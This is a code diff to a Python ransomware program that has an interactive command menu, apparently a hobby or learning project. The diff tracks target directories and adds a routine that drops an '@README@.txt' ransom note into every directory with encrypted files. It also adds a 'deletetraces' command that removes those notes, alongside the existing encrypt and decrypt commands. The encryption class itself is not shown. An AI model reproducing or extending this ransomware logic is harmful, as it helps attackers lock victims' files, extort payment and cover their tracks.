@@ -6,6 +6,8 @@ class Program():
         self.__mode__ = "manual"  # default mode
         self.__system__ = "Darwin"  # default system
         self.__criptography: CryptoGraphy = None
+        self.__directories_with_files = []
+        self.__found_files = []
         if data is not None:
             pass
         
@@ -77,7 +79,15 @@ class Program():
             self.__criptography.encrypt(file)
 
     def __ransomnote(self):
-        pass
+        with open("ransom_note.txt", "r") as note_file:
+            content = note_file.read()
+
+        for dir in self.__directories_with_files:
+            self.__create_ransomnote_file(dir, content)
+
+    def __create_ransomnote_file(self, dst_path=".", content=None):
+        with open(dst_path + "/@README@.txt", "w") as output_file:
+            output_file.write(content)
 
     def __decrypt(self):
         if self.__criptography is None:
@@ -86,6 +96,14 @@ class Program():
 
         for file in self.__found_files:
             self.__criptography.decrypt(file + ".ENCRYPTED")
+
+    def __delete_traces(self):
+        print("Deleting traces...")
+        
+        for dir in self.__directories_with_files:
+            ransomnote_path = dir + "/@README@.txt"
+            if os.path.exists(ransomnote_path):
+                os.remove(ransomnote_path)
 
     def __cli(self):
         while True:
@@ -112,7 +130,8 @@ class Program():
                     print("\tencrypt - encrypts the discovered files")
                     print("\transomnote - displays the ransom note to the user")
                     print("\tdecrypt - decrypts the previously encrypted files")
-                    print("\texit - quit the program")
+                    print("\tdeletetraces - deletes traces of the program")
+                    print("\texit or quit - quit the program")
 
                 case "greet":
                     print("Hello! This is your custom CLI.")
@@ -152,6 +171,9 @@ class Program():
 
                 case "decrypt":
                     self.__decrypt()
+
+                case "deletetraces":
+                    self.__delete_traces()
 
                 case "exit" | "quit":
                     print("Exiting...")
